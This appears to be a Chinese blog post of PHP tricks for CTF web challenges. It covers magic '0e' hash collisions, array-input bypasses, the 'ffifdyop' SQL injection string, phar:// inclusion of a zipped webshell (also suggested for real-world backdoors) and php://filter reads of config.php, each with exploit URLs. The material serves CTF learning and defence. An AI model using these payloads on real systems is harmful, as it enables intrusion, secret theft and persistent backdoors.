---
layout: post
title: Some features of PHP in CTF
comments: false
description: ""
keywords: "Tricks"
---

CTF中关于PHP一些特性的利用；

套路是要有的，知识点也是必须的；

## 弱类型比较

在CTF中很常见，动不动`==`&&`===`；

![PHP弱类型比较.jpg](/assets/images/2017-04-16/4046831037.jpg)

## Hash比较

一、md5()：==

PHP在处理哈希字符串时，会利用"!="或"=="来对哈希值进行弱类型比较，它把每一个以 `0e` 开头的哈希值都解释为`0`，所以如果两个不同的密码经过哈希以后，其哈希值都是以"0E"开头的，那么PHP将会认为他们相同，都是0；

```
<?php
	var_dump("0e462097431906509019562988736854"==="0");
	var_dump("0e462097431906509019562988736854"=="0");
?>

bool(false)
bool(true)
```

一些 `0e` 开头的特殊字符串：

```
全数字：
240610708
0e462097431906509019562988736854

全字母：
QNKCDZO
0e830400451993494058024219903391

其他：
s878926199a
0e545993274517709034328855841020
  
s155964671a
0e342768416822451524974117254469
```

e.g.

```
<?php
error_reporting(0);
$flag = 'flag{FlagIsHere}';
if (isset($_GET['username']) and isset($_GET['password'])) {
    if ($_GET['username'] == $_GET['password'])
        print 'Your password can not be your username.';
    else if (md5($_GET['username']) == md5($_GET['password']))
        die($flag);
    else
        print 'Invalid password';
}
?>

http://127.0.0.1/ctf.php?username=240610708&password=QNKCDZO
```

二、sha1()、md5()：===

利用数组来绕过 `===` 恒等，md5()和sha1()对一个数组进行加密将返回 NULL；

而 NULL===NULL，所以可绕过判断。

```
<?php
	$a = md5(array());
	$b = sha1(array());
	var_dump($a);
	var_dump($b);
	var_dump($a === $b);
	var_dump($a == $b);
?>

NULL
NULL
bool(true)
bool(true)
```

e.g.

```
<?php
error_reporting(0);
$flag = 'flag{FlagIsHere}';
if (isset($_GET['username']) and isset($_GET['password'])) {
    if ($_GET['username'] == $_GET['password'])
        print 'Your password can not be your username.';
    else if (md5($_GET['username']) === sha1($_GET['password']))
        die($flag);
    else
        print 'Invalid password';
}
?>
  
http://127.0.0.1/ctf.php?username[]=1&password[]=2
```

## ereg()和strpos()

ereg()函数：字符串正则匹配。

strpos() 函数：查找字符串在另一字符串中第一次出现的位置。

注释：strpos() 函数对大小写敏感。

两个函数都是处理字符串的函数；

这时就可以利用数组来绕过；

```
<?php
    $a = '.....';
    if (ereg ("^[a-zA-Z0-9]+$", $a) === false){  
        echo "You password must be alphanumeric\n"; 
        }
    $b = '123hhh';
    if (strpos ($b, 'hh') !== false){
        die("flag"); 
    }
?>
  
You password must be alphanumeric
flag
```

e.g.

数组 ereg是处理字符串的，传入数组后返回NULL，NULL和 FALSE，是不恒等（===）的，绕过第一个if；而strpos也是处理字符串的，传入数组后返回NULL，NULL!==FALSE，条件成立，拿到flag；

```
<?php
	error_reporting(0);
	$flag = 'flag{FlagIsHere}';
	if (isset ($_GET['password'])) {  
	    if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)  
	        echo 'You password must be alphanumeric';  
	    else if (strpos ($_GET['password'], '--') !== FALSE)  
	        die($flag);  
	    else  
	        echo 'Invalid password';  
	}  
?>
  
http://127.0.0.1/ctf.php?password[]=1
```

## 数字运算

一、不同类型数据比较运算

is_numeric函数中判断temp的值是否为数字类型，如果是数字或数字字符串则返回true绕过函数，否咋返回Sorry....并退出脚本；

if判断是如果temp的数值大于1336则显示flag，这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval数字化再比；

如果输入一个1337a这样的字符串，在is_numeric中返回true，然后在比较时会被转换成数字1337，这样就绕过判断输出flag。

```
<?php
	error_reporting(0);
	$flag = 'flag{FlagIsHere}';
	$temp = $_GET['temp'];
	is_numeric($temp)?die("Sorry...."):NULL;    
	if($temp>1336){
	    echo $flag;
	} 
?>
  
http://127.0.0.1/ctf.php?temp=1337a
```

二、精度绕过

php精度（16以上）；

```
<?php
    var_dump(0.9999999999999999999==1);
?>
  
bool(true)
```

PHP和MySQL中浮点数精度不同的特性：

在PHP中1.0000000000000001 !== 1；

而在MySQL中1.0000000000000001 == 1；

三、科学计数法绕过

password至少需要12位，绕过第一个if；

必须等于（==）42.才能拿到flag；

这里就可以使用科学计数法420.00000e-1；

```
<?php
	error_reporting(0);
	$flag = 'flag{FlagIsHere}';
    $password = $_GET['password']; 
    var_dump(preg_match('/^[[:graph:]]{12,}$/', $password));
    if (0 >= preg_match('/^[[:graph:]]{12,}$/', $password)) 
    { 
        echo 'Wrong Format'; 
        exit; 
    } 
	if ("42" == $password) echo $flag; 
    else echo 'Wrong password'; 
    exit; 
?>
  
http://127.0.0.1/ctf.php?password=420.00000e-1
```

## true and false

当有两个 `is_numeric` 判断并用 `and` 连接时，and后面的is_numeric可以绕过；

即 `true and false=true`；

```
<?php
    $a=123;
    $b='abc';
    $c=is_numeric($a) and is_numeric($b);
    var_dump(is_numeric($a));
    var_dump(is_numeric($b)); 
    var_dump($c);  //$b可以不是数字，同样返回true
    $test=false and true;
    var_dump($test); //返回false
    $test=true and false;
    var_dump($test); //返回true
?>
  
bool(true)
bool(false)
bool(true)
bool(false)
bool(true)
```

e.g.

```
<?php
	error_reporting(0);
	$flag = 'flag{FlagIsHere}';
	$a=$_GET['a'];
	$b=$_GET['b'];
	$c=is_numeric($a) and is_numeric($b);
	if (!is_numeric($b)) {
		if ($c == True) {
			echo $flag;
		}
	}
	else {
		echo 'Sorry....';
	}
?>
  
http://127.0.0.1/ctf.php?a=123&b=abc
```

## md5特例

SQL语句是：

```
$sql = "SELECT * FROM users WHERE password = '".md5($password,true)."'";
```

出现了md5($password,true)函数，参数true的作用是将md5后的hex转换成字符串；

如果md5之后生成的字符串存在在单引号就可以实现注入；

有个特殊字符串：`ffifdyop`

```
printf 'ffifdyop' | md5sum
276f722736c95d99e921722cf9ed621c

即：'or'6?]??!r,??b
```

`'or'6` 是个永真的条件，在where语句的判断永真，即可输出表下所有数据；

## short_open_tag=on 短标签

当 php.ini 的`short_open_tag=on`时，PHP支持短标签，默认情况下为off；

格式为：`<?xxxx;?>` --> `<?xxx;`

命令绕过字数限制：`echo` --> `=`

e.g.

```
Go0s@ubuntu:~$ cat test.php
<?="helloworld";
Go0s@ubuntu:~$ curl 127.0.0.1/test.php
helloworld
```

## 反引号

反引号 ** \` ** 等同于 `shell_exec()`；

可用于执行系统命令并输出；

## Phar 伪协议（绕过包含）

**适用场景：**

1.CTF 中突破文件包含；

2.实际留后门，维持权限；

**官方说明：**

phar 伪协议：[http://php.net/manual/en/intro.phar.php](http://php.net/manual/en/intro.phar.php)

类似 Java 的 jar 包，是个压缩文件，在 PHP5.3 版本之后出现；

其出现本意是方便程序员将程序打包部署到线上机器，但可在别处发挥利用；

关键代码：

```
<?php
	include 'phar:///path/to/myphar.phar/file.php';
?>
```

这里就可以肆意发挥了，但前提是存在包含漏洞；

可以直接创建一个这样的 PHP 文件，直接来包含执行，也可以直接在URL上GET过去…

**Note：**

1.这里除了 phar 压缩包，就只能用 **zip** 来解压，rar 压缩是不被识别的，即使用 zip 压缩后可重命名为任意后缀；

2.并不需要 php.ini 的 allow_url_include 开启，所以默认即可识别；

3.官方有脚本来实现生成 phar 压缩包（phar压缩包是不是利用 zip 来压缩？），但不如 zip 压缩来得方便；

**实例：**

**1.本地模拟实际环境**

在本地新建 test.php ：

```
<?php
	include 'phar://test.zip/test.txt';
?>
```

意思就是利用 phar 协议去打开 test.zip 压缩包里面的 test.txt ，然后包含执行；

![20170407182510.png](/assets/images/2017-04-16/557506079.png)

![20170407182729.png](/assets/images/2017-04-16/2557905593.png)

**2.2016 SWPU CTF（ WEB100）**

题目只能上传jpg/png/gif文件且自动在最后加上 .php 后缀；

于是构造路径并通过 phar:// 伪协议进行访问，URL 如下：

```
http://xxx.xxx.xxx.xxx/index.php?id=phar://路径/x.jpg/shell
```

其中 x.jpg 是一个 zip 压缩文件，压缩包中存在一个 shell.php 的一句话后门；

通过访问直接在 shell 后加上 .php 补全文件名，即可利用 phar 协议拿到压缩包中的 shell.php 并包含来 getshell；

## filter 伪协议

绕过一些限制，编码输出；

e.g.

```
if(isset($_GET['file'])===false)
    echo "None";
elseif(is_file($_GET['file']))
    echo "you cannot give me a file";
else
    readfile($_GET['file']);
```

`elseif(is_file($_GET['file']))`进行了限制，这里完全利用filter伪协议绕过is_file；

```
/member.php?file=php://filter/read=convert.base64-encode/resource=config.php
```

readfile()利用伪协议读取到config.php文件内容；
